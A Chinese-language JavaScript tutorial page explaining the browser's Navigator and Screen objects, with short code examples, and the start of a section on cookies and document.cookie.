<span>精通各语言拼写的野生程序员</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="博客" class="dropdown-title"><a href="/blogs/" class="link-title">博客</a> <span class="title" style="display:none;">博客</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/WuKongNotNull/awesome-free-vpn" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  科学上网
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="/categories/?category=%E5%A5%BD%E7%89%A9%E6%8E%A8%E8%8D%90%E5%AE%98&amp;.html" class="nav-link">好物推荐官</a></li><li class="dropdown-item"><!----> <a href="/categories/?category=%E9%9A%8F%E7%AC%94&amp;.html" class="nav-link">随笔感悟</a></li></ul></div></div><div class="nav-item"><a href="/pages/3ad3de/" class="nav-link">编程导航</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Java" class="dropdown-title"><a href="/java/" class="link-title">Java</a> <span class="title" style="display:none;">Java</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/java/javase/" class="nav-link">JavaSE</a></li><li class="dropdown-item"><!----> <a href="/java/javaee/" class="nav-link">JavaEE</a></li><li class="dropdown-item"><!----> <a href="/java/spring/" class="nav-link">Spring</a></li><li class="dropdown-item"><!----> <a href="/java/mybatis/" class="nav-link">MyBatis</a></li><li class="dropdown-item"><!----> <a href="/java/springboot/" class="nav-link">SpringBoot</a></li><li class="dropdown-item"><!----> <a href="/java/springcloud/" class="nav-link">SpringCloud</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Python" class="dropdown-title"><a href="/python/" class="link-title">Python</a> <span class="title" style="display:none;">Python</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/python/tutorial/" class="nav-link">Python教程</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="大前端" class="dropdown-title"><a href="/fore/" class="link-title">大前端</a> <span class="title" style="display:none;">大前端</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/fore/javascript/" class="nav-link">JavaScript基础教程</a></li><li class="dropdown-item"><!----> <a href="/fore/js/" class="nav-link">JavaScript高级程序设计</a></li><li class="dropdown-item"><!----> <a href="/fore/es6/" class="nav-link">ES6 教程</a></li><li class="dropdown-item"><!----> <a href="/fore/vue/" class="nav-link">Vue</a></li><li class="dropdown-item"><!----> <a href="/fore/react/" class="nav-link">React</a></li><li class="dropdown-item"><!----> <a href="/fore/typescript-axios/" class="nav-link">TypeScript 从零实现 axios</a></li><li class="dropdown-item"><!----> <a href="/fore/git/" class="nav-link">Git</a></li><li class="dropdown-item"><!----> <a href="/pages/51afd6/" class="nav-link">TypeScript</a></li><li class="dropdown-item"><!----> <a href="/pages/4643cd/" class="nav-link">JS设计模式总结</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="面试" class="dropdown-title"><a href="/interview/" class="link-title">面试</a> <span class="title" style="display:none;">面试</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/interview/c/" class="nav-link">C开发岗</a></li><li class="dropdown-item"><!----> <a href="/interview/java/" class="nav-link">Java开发岗</a></li><li class="dropdown-item"><!----> <a href="/interview/python/" class="nav-link">Python开发岗</a></li><li class="dropdown-item"><!----> <a href="/interview/hr/" class="nav-link">人事爱问</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="更多" class="dropdown-title"><a href="/more/" class="link-title">更多</a> <span class="title" style="display:none;">更多</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/f4931c/" class="nav-link">Linux</a></li><li class="dropdown-item"><!----> <a href="/norm/alisongshan/" class="nav-link">阿里Java开发手册</a></li><li class="dropdown-item"><!----> <a href="/pages/f2a556/" class="nav-link">学习</a></li><li class="dropdown-item"><!----> <a href="/pages/aea6571b7a8bae86/" class="nav-link">面试</a></li><li class="dropdown-item"><!----> <a href="/pages/2d615df9a36a98ed/" class="nav-link">心情杂货</a></li><li class="dropdown-item"><!----> <a href="/pages/baaa02/" class="nav-link">实用技巧</a></li><li class="dropdown-item"><!----> <a href="/friends/" class="nav-link">友情链接</a></li><li class="dropdown-item"><!----> <a href="/pages/9a7ee40fc232253e/" class="nav-link">技术文档</a></li><li class="dropdown-item"><!----> <a href="/pages/4c778760be26d8b3/" class="nav-link">GitHub技巧</a></li><li class="dropdown-item"><!----> <a href="/pages/117708e0af7f0bd9/" class="nav-link">Nodejs</a></li><li class="dropdown-item"><!----> <a href="/pages/41f87d890d0a02af/" class="nav-link">博客搭建</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div><div class="nav-item"><a href="/about/" class="nav-link">关于我</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>JavaScript基础教程</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading open"><span>青铜</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><section class="sidebar-group collapsable is-sub-group depth-2"><p class="sidebar-heading open"><span>入门</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/49877d/" class="sidebar-link">入门篇</a></li></ul></section></li><li><section class="sidebar-group collapsable is-sub-group depth-2"><p class="sidebar-heading"><span>数据类型</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-2"><p class="sidebar-heading"><span>运算符</span> <span class="arrow right"></span></p> <!----></section></li><li><a href="/pages/36f9e8/" class="sidebar-link">语法专题</a></li><li><a href="/pages/3e3990/" class="sidebar-link">标准库</a></li><li><a href="/pages/32c5b1/" class="sidebar-link">面向对象编程</a></li><li><a href="/pages/73df15/" class="sidebar-link">异步操作</a></li><li><a href="/pages/91f216/" class="sidebar-link">DOM</a></li><li><a href="/pages/329076/" class="sidebar-link">事件</a></li><li><a href="/pages/229568/" class="sidebar-link">浏览器模型(一)</a></li><li><a href="/pages/ffb0a1/" aria-current="page" class="active sidebar-link">浏览器模型(二)</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#navigator对象-screen对象" class="sidebar-link">Navigator对象，Screen对象</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#navigator-对象的属性" class="sidebar-link">Navigator 对象的属性</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#navigator-对象的方法" class="sidebar-link">Navigator 对象的方法</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#navigator-的实验性属性" class="sidebar-link">Navigator 的实验性属性</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#screen-对象" class="sidebar-link">Screen 对象</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#cookie" class="sidebar-link">Cookie</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#概述" class="sidebar-link">概述</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#cookie-与-http-协议" class="sidebar-link">Cookie 与 HTTP 协议</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#cookie-的属性" class="sidebar-link">Cookie 的属性</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#document-cookie" class="sidebar-link">document.cookie</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#参考链接" class="sidebar-link">参考链接</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#xml-httprequest-对象" class="sidebar-link">XML HttpRequest 对象</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#简介" class="sidebar-link">简介</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#xmlhttprequest-的实例属性" class="sidebar-link">XMLHttpRequest 的实例属性</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#xmlhttprequest-的实例方法" class="sidebar-link">XMLHttpRequest 的实例方法</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#xmlhttprequest-实例的事件" class="sidebar-link">XMLHttpRequest 实例的事件</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#navigator-sendbeacon-2" class="sidebar-link">Navigator.sendBeacon()</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#同源限制" class="sidebar-link">同源限制</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#概述-2" class="sidebar-link">概述</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#cookie-2" class="sidebar-link">Cookie</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#iframe-和多窗口通信" class="sidebar-link">iframe 和多窗口通信</a></li><li class="sidebar-sub-header"><a href="/pages/ffb0a1/#ajax" class="sidebar-link">AJAX</a></li></ul></li></ul></li><li><a href="/pages/b7cf03/" class="sidebar-link">浏览器模型(三)</a></li><li><a href="/pages/610238/" class="sidebar-link">浏览器模型(四)</a></li></ul></section></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>JavaScript</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>《ES6 教程》笔记</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>《Vue》笔记</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>《React》笔记</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>《TypeScript 从零实现 axios》</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>《Git》学习笔记</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>JavaScript文章</span> <span class="arrow right"></span></p> <!----></section></li></ul> <div class="sidebar-slot sidebar-slot-bottom"><!-- 正方形 -->
+      <ins class="adsbygoogle"
+          style="display:block"
+          data-ad-client="ca-pub-7828333725993554"
+          data-ad-slot="3508773082"
+          data-ad-format="auto"
+          data-full-width-responsive="true"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script></div></aside> <div><main class="page"><div class="theme-vdoing-wrapper bg-style-1"><div class="articleInfo-wrap" data-v-1cd794fe><div class="articleInfo" data-v-1cd794fe><ul class="breadcrumbs" data-v-1cd794fe><li data-v-1cd794fe><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-1cd794fe></a></li> <li data-v-1cd794fe><a href="/fore" title="大前端-目录页" data-v-1cd794fe>大前端</a></li> <li data-v-1cd794fe><a href="/fore/#JavaScript基础教程" title="大前端#JavaScript基础教程" data-v-1cd794fe>JavaScript基础教程</a></li> <li data-v-1cd794fe><a href="/fore/#青铜" title="大前端#青铜" data-v-1cd794fe>青铜</a></li></ul> <div class="info" data-v-1cd794fe><div title="作者" class="author iconfont icon-touxiang" data-v-1cd794fe><a href="https://github.com/wuKongNotNull" target="_blank" title="作者" class="beLink" data-v-1cd794fe>悟空非空也</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-1cd794fe><a href="javascript:;" data-v-1cd794fe>2021-12-11</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">
+          浏览器模型(二)
+        </h1> <div class="page-slot page-slot-top"><!-- 固定100% * 90px可显示，max-height:90px未见显示-->
+     <ins class="adsbygoogle"
+          style="display:inline-block;width:100%;max-height:90px"
+          data-ad-client="ca-pub-7828333725993554"
+          data-ad-slot="6625304284"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script></div> <div class="theme-vdoing-content content__default"><h1 id="浏览器模型"><a href="#浏览器模型" class="header-anchor">#</a> 浏览器模型</h1> <h2 id="navigator对象-screen对象"><a href="#navigator对象-screen对象" class="header-anchor">#</a> Navigator对象，Screen对象</h2> <p><code>window.navigator</code>属性指向一个包含浏览器和系统信息的 Navigator 对象。脚本通过这个属性了解用户的环境信息。</p> <h5 id=""><a href="#" class="header-anchor">#</a></h5> <h3 id="navigator-对象的属性"><a href="#navigator-对象的属性" class="header-anchor">#</a> Navigator 对象的属性</h3> <h4 id="navigator-useragent"><a href="#navigator-useragent" class="header-anchor">#</a> Navigator.userAgent</h4> <p><code>navigator.userAgent</code>属性返回浏览器的 User Agent 字符串，表示用户设备信息，包含了浏览器的厂商、版本、操作系统等信息。</p> <p>下面是 Chrome 浏览器的<code>userAgent</code>。</p> <div class="language- extra-class"><pre class="language-text"><code>navigator.userAgent
+// &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36&quot;
+</code></pre></div><p>通过<code>userAgent</code>属性识别浏览器，不是一个好办法。因为必须考虑所有的情况（不同的浏览器，不同的版本），非常麻烦，而且用户可以改变这个字符串。这个字符串的格式并无统一规定，也无法保证未来的适用性，各种上网设备层出不穷，难以穷尽。所以，现在一般不再通过它识别浏览器了，而是使用“功能识别”方法，即逐一测试当前浏览器是否支持要用到的 JavaScript 功能。</p> <p>不过，通过<code>userAgent</code>可以大致准确地识别手机浏览器，方法就是测试是否包含<code>mobi</code>字符串。</p> <div class="language- extra-class"><pre class="language-text"><code>var ua = navigator.userAgent.toLowerCase();
+
+if (/mobi/.test(ua)) {
+  // 手机浏览器
+} else {
+  // 非手机浏览器
+}
+</code></pre></div><p>如果想要识别所有移动设备的浏览器，可以测试更多的特征字符串。</p> <div class="language- extra-class"><pre class="language-text"><code>/mobi|android|touch|mini/.test(ua)
+</code></pre></div><h4 id="navigator-plugins"><a href="#navigator-plugins" class="header-anchor">#</a> Navigator.plugins</h4> <p><code>Navigator.plugins</code>属性返回一个类似数组的对象，成员是 Plugin 实例对象，表示浏览器安装的插件，比如 Flash、ActiveX 等。</p> <div class="language- extra-class"><pre class="language-text"><code>var pluginsLength = navigator.plugins.length;
+
+for (var i = 0; i &lt; pluginsLength; i++) {
+  console.log(navigator.plugins[i].name);
+  console.log(navigator.plugins[i].filename);
+  console.log(navigator.plugins[i].description);
+  console.log(navigator.plugins[i].version);
+}
+</code></pre></div><h4 id="navigator-platform"><a href="#navigator-platform" class="header-anchor">#</a> Navigator.platform</h4> <p><code>Navigator.platform</code>属性返回用户的操作系统信息，比如<code>MacIntel</code>、<code>Win32</code>、<code>Linux x86_64</code>等 。</p> <div class="language- extra-class"><pre class="language-text"><code>navigator.platform
+// &quot;Linux x86_64&quot;
+</code></pre></div><h4 id="navigator-online"><a href="#navigator-online" class="header-anchor">#</a> Navigator.onLine</h4> <p><code>navigator.onLine</code>属性返回一个布尔值，表示用户当前在线还是离线（浏览器断线）。</p> <div class="language- extra-class"><pre class="language-text"><code>navigator.onLine // true
+</code></pre></div><p>有时，浏览器可以连接局域网，但是局域网不能连通外网。这时，有的浏览器的<code>onLine</code>属性会返回<code>true</code>，所以不能假定只要是<code>true</code>，用户就一定能访问互联网。不过，如果是<code>false</code>，可以断定用户一定离线。</p> <p>用户变成在线会触发<code>online</code>事件，变成离线会触发<code>offline</code>事件，可以通过<code>window.ononline</code>和<code>window.onoffline</code>指定这两个事件的回调函数。</p> <div class="language- extra-class"><pre class="language-text"><code>window.addEventListener('offline', function(e) { console.log('offline'); });
+window.addEventListener('online', function(e) { console.log('online'); });
+</code></pre></div><h4 id="navigator-language-navigator-languages"><a href="#navigator-language-navigator-languages" class="header-anchor">#</a> Navigator.language，Navigator.languages</h4> <p><code>Navigator.language</code>属性返回一个字符串，表示浏览器的首选语言。该属性只读。</p> <div class="language- extra-class"><pre class="language-text"><code>navigator.language // &quot;en&quot;
+</code></pre></div><p><code>Navigator.languages</code>属性返回一个数组，表示用户可以接受的语言。<code>Navigator.language</code>总是这个数组的第一个成员。HTTP 请求头信息的<code>Accept-Language</code>字段，就来自这个数组。</p> <div class="language- extra-class"><pre class="language-text"><code>navigator.languages  // [&quot;en-US&quot;, &quot;en&quot;, &quot;zh-CN&quot;, &quot;zh&quot;, &quot;zh-TW&quot;]
+</code></pre></div><p>如果这个属性发生变化，就会在<code>window</code>对象上触发<code>languagechange</code>事件。</p> <h4 id="navigator-geolocation"><a href="#navigator-geolocation" class="header-anchor">#</a> Navigator.geolocation</h4> <p><code>Navigator.geolocation</code>属性返回一个 Geolocation 对象，包含用户地理位置的信息。注意，该 API 只有在 HTTPS 协议下可用，否则调用下面方法时会报错。</p> <p>Geolocation 对象提供下面三个方法。</p> <ul><li>Geolocation.getCurrentPosition()：得到用户的当前位置</li> <li>Geolocation.watchPosition()：监听用户位置变化</li> <li>Geolocation.clearWatch()：取消<code>watchPosition()</code>方法指定的监听函数</li></ul> <p>注意，调用这三个方法时，浏览器会跳出一个对话框，要求用户给予授权。</p> <h4 id="navigator-cookieenabled"><a href="#navigator-cookieenabled" class="header-anchor">#</a> Navigator.cookieEnabled</h4> <p><code>navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器的 Cookie 功能是否打开。</p> <div class="language- extra-class"><pre class="language-text"><code>navigator.cookieEnabled // true
+</code></pre></div><p>注意，这个属性反映的是浏览器总的特性，与是否储存某个具体的网站的 Cookie 无关。用户可以设置某个网站不得储存 Cookie，这时<code>cookieEnabled</code>返回的还是<code>true</code>。</p> <h3 id="navigator-对象的方法"><a href="#navigator-对象的方法" class="header-anchor">#</a> Navigator 对象的方法</h3> <h4 id="navigator-javaenabled"><a href="#navigator-javaenabled" class="header-anchor">#</a> Navigator.javaEnabled()</h4> <p><code>navigator.javaEnabled()</code>方法返回一个布尔值，表示浏览器是否能运行 Java Applet 小程序。</p> <div class="language- extra-class"><pre class="language-text"><code>navigator.javaEnabled() // false
+</code></pre></div><h4 id="navigator-sendbeacon"><a href="#navigator-sendbeacon" class="header-anchor">#</a> Navigator.sendBeacon()</h4> <p><code>Navigator.sendBeacon()</code>方法用于向服务器异步发送数据，详见《XMLHttpRequest 对象》一章。</p> <h3 id="navigator-的实验性属性"><a href="#navigator-的实验性属性" class="header-anchor">#</a> Navigator 的实验性属性</h3> <p>Navigator 对象有一些实验性属性，在部分浏览器可用。</p> <h4 id="navigator-devicememory"><a href="#navigator-devicememory" class="header-anchor">#</a> Navigator.deviceMemory</h4> <p><code>navigator.deviceMemory</code>属性返回当前计算机的内存数量（单位为 GB）。该属性只读，只在 HTTPS 环境下可用。</p> <p>它的返回值是一个近似值，四舍五入到最接近的2的幂，通常是 0.25、0.5、1、2、4、8。实际内存超过 8GB，也返回<code>8</code>。</p> <div class="language- extra-class"><pre class="language-text"><code>if (navigator.deviceMemory &gt; 1) {
+  await import('./costly-module.js');
+}
+</code></pre></div><p>上面示例中，只有当前内存大于 1GB，才加载大型的脚本。</p> <h4 id="navigator-hardwareconcurrency"><a href="#navigator-hardwareconcurrency" class="header-anchor">#</a> Navigator.hardwareConcurrency</h4> <p><code>navigator.hardwareConcurrency</code>属性返回用户计算机上可用的逻辑处理器的数量。该属性只读。</p> <p>现代计算机的 CPU 有多个物理核心，每个物理核心有时支持一次运行多个线程。因此，四核 CPU 可以提供八个逻辑处理器核心。</p> <div class="language- extra-class"><pre class="language-text"><code>if (navigator.hardwareConcurrency &gt; 4) {
+  await import('./costly-module.js');
+}
+</code></pre></div><p>上面示例中，可用的逻辑处理器大于4，才会加载大型脚本。</p> <p>该属性通过用于创建 Web Worker，每个可用的逻辑处理器都创建一个 Worker。</p> <div class="language- extra-class"><pre class="language-text"><code>let workerList = [];
+
+for (let i = 0; i &lt; window.navigator.hardwareConcurrency; i++) {
+  let newWorker = {
+    worker: new Worker('cpuworker.js'),
+    inUse: false
+  };
+  workerList.push(newWorker);
+}
+</code></pre></div><p>上面示例中，有多少个可用的逻辑处理器，就创建多少个 Web Worker。</p> <h4 id="navigator-connection"><a href="#navigator-connection" class="header-anchor">#</a> Navigator.connection</h4> <p><code>navigator.connection</code>属性返回一个对象，包含当前网络连接的相关信息。</p> <ul><li>downlink：有效带宽估计值（单位：兆比特/秒，Mbps），四舍五入到每秒 25KB 的最接近倍数。</li> <li>downlinkMax：当前连接的最大下行链路速度（单位：兆比特每秒，Mbps）。</li> <li>effectiveType：返回连接的等效类型，可能的值为<code>slow-2g</code>、<code>2g</code>、<code>3g</code>、<code>4g</code>。</li> <li>rtt：当前连接的估计有效往返时间，四舍五入到最接近的25毫秒的倍数。</li> <li>saveData：用户是否设置了浏览器的减少数据使用量选项（比如不加载图片），返回<code>true</code>或者<code>false</code>。</li> <li>type：当前连接的介质类型，可能的值为<code>bluetooth</code>、<code>cellular</code>、<code>ethernet</code>、<code>none</code>、<code>wifi</code>、<code>wimax</code>、<code>other</code>、<code>unknown</code>。</li></ul> <div class="language- extra-class"><pre class="language-text"><code>if (navigator.connection.effectiveType === '4g') {
+  await import('./costly-module.js');
+}
+</code></pre></div><p>上面示例中，如果网络连接是 4G，则加载大型脚本。</p> <h3 id="screen-对象"><a href="#screen-对象" class="header-anchor">#</a> Screen 对象</h3> <p>Screen 对象表示当前窗口所在的屏幕，提供显示设备的信息。<code>window.screen</code>属性指向这个对象。</p> <p>该对象有下面的属性。</p> <ul><li><code>Screen.height</code>：浏览器窗口所在的屏幕的高度（单位像素）。除非调整显示器的分辨率，否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。</li> <li><code>Screen.width</code>：浏览器窗口所在的屏幕的宽度（单位像素）。</li> <li><code>Screen.availHeight</code>：浏览器窗口可用的屏幕高度（单位像素）。因为部分空间可能不可用，比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于<code>height</code>减去那些被系统组件的高度。</li> <li><code>Screen.availWidth</code>：浏览器窗口可用的屏幕宽度（单位像素）。</li> <li><code>Screen.pixelDepth</code>：整数，表示屏幕的色彩位数，比如<code>24</code>表示屏幕提供24位色彩。</li> <li><code>Screen.colorDepth</code>：<code>Screen.pixelDepth</code>的别名。严格地说，colorDepth 表示应用程序的颜色深度，pixelDepth 表示屏幕的颜色深度，绝大多数情况下，它们都是同一件事。</li> <li><code>Screen.orientation</code>：返回一个对象，表示屏幕的方向。该对象的<code>type</code>属性是一个字符串，表示屏幕的具体方向，<code>landscape-primary</code>表示横放，<code>landscape-secondary</code>表示颠倒的横放，<code>portrait-primary</code>表示竖放，<code>portrait-secondary</code>表示颠倒的竖放。</li></ul> <p>下面是<code>Screen.orientation</code>的例子。</p> <div class="language- extra-class"><pre class="language-text"><code>window.screen.orientation
+// { angle: 0, type: &quot;landscape-primary&quot;, onchange: null }
+</code></pre></div><p>下面的例子保证屏幕分辨率大于 1024 x 768。</p> <div class="language- extra-class"><pre class="language-text"><code>if (window.screen.width &gt;= 1024 &amp;&amp; window.screen.height &gt;= 768) {
+  // 分辨率不低于 1024x768
+}
+</code></pre></div><p>下面是根据屏幕的宽度，将用户导向不同网页的代码。</p> <div class="language- extra-class"><pre class="language-text"><code>if ((screen.width &lt;= 800) &amp;&amp; (screen.height &lt;= 600)) {
+  window.location.replace('small.html');
+} else {
+  window.location.replace('wide.html');
+}
+</code></pre></div><h3 id="cookie"><a href="#cookie" class="header-anchor">#</a> Cookie</h3> <h3 id="概述"><a href="#概述" class="header-anchor">#</a> 概述</h3> <p>Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p> <p>HTTP 协议不带有状态，有些请求需要区分状态，就通过 Cookie 附带字符串，让服务器返回不一样的回应。举例来说，用户登录以后，服务器往往会在网站上留下一个 Cookie，记录用户编号（比如<code>id=1234</code>），以后每次浏览器向服务器请求数据，就会带上这个字符串，服务器从而知道是谁在请求，应该回应什么内容。</p> <p>Cookie 的目的就是区分用户，以及放置状态信息，它的使用场景主要如下。</p> <ul><li>对话（session）管理：保存登录状态、购物车等需要记录的信息。</li> <li>个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。</li> <li>追踪用户：记录和分析用户行为。</li></ul> <p>Cookie 不是一种理想的客户端存储机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端存储建议使用 Web storage API 和 IndexedDB。只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。</p> <p>每个 Cookie 都有以下几方面的元数据。</p> <ul><li>Cookie 的名字</li> <li>Cookie 的值（真正的数据写在这里面）</li> <li>到期时间（超过这个时间会失效）</li> <li>所属域名（默认为当前域名）</li> <li>生效的路径（默认为当前网址）</li></ul> <p>举例来说，用户访问网址<code>www.example.com</code>，服务器在浏览器写入一个 Cookie。这个 Cookie 的所属域名为<code>www.example.com</code>，生效路径为根路径<code>/</code>。</p> <p>如果 Cookie 的生效路径设为<code>/forums</code>，那么这个 Cookie 只有在访问<code>www.example.com/forums</code>及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 Cookie，一起发送给服务器。</p> <p>用户可以设置浏览器不接受 Cookie，也可以设置不向服务器发送 Cookie。<code>window.navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p> <div class="language- extra-class"><pre class="language-text"><code>window.navigator.cookieEnabled // true
+</code></pre></div><p><code>document.cookie</code>属性返回当前网页的 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie // &quot;id=foo;key=bar&quot;
